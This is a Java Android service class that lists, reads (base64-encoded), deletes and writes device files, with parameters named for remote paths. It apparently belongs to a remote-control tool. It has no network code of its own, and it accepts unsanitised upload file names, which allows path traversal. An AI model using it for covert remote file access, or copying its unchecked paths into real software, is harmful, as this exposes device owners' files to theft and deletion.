package com.nullx.pp;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;

public class FileManagerService extends Service {
    private static final String TAG = "CRPT.FileManager";
    
    // Fix: Helper method untuk menangani JSONException
    private String createErrorJson(String message) {
        try {
            if (message == null) message = "Unknown error";
            return new JSONObject().put("error", message).toString();
        } catch (JSONException e) {
            return "{\"error\": \"json_error\"}";
        }
    }
    
    public String listFiles(String path) {
        try {
            File dir = new File(path);
            JSONArray filesArray = new JSONArray();
            
            if (dir.exists() && dir.isDirectory()) {
                File[] files = dir.listFiles();
                if (files != null) {
                    for (File file : files) {
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", file.getName());
                        fileObj.put("path", file.getAbsolutePath());
                        fileObj.put("isDirectory", file.isDirectory());
                        fileObj.put("size", file.length());
                        fileObj.put("modified", file.lastModified());
                        filesArray.put(fileObj);
                    }
                }
            }
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("files", filesArray);
            return result.toString();
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }
    
    public String downloadFile(String remotePath) {
        try {
            File file = new File(remotePath);
            if (!file.exists()) {
                return createErrorJson("File not found");
            }
            
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            
            String base64Content = Base64.encodeToString(data, Base64.NO_WRAP);
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("content", base64Content);
            result.put("size", file.length());
            return result.toString();
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }
    
    public String removeFile(String remotePath) {
        try {
            File file = new File(remotePath);
            boolean deleted = file.delete();
            JSONObject result = new JSONObject();
            result.put("success", deleted);
            return result.toString();
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }
    
    public String uploadFile(String fileName, byte[] content) {
        try {
            File destDir = new File(Environment.getExternalStorageDirectory(), "Download");
            if (!destDir.exists()) destDir.mkdirs();
            
            File destFile = new File(destDir, fileName);
            FileOutputStream fos = new FileOutputStream(destFile);
            fos.write(content);
            fos.close();
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("destPath", destFile.getAbsolutePath());
            return result.toString();
        } catch (Exception e) {
            return createErrorJson(e.getMessage());
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}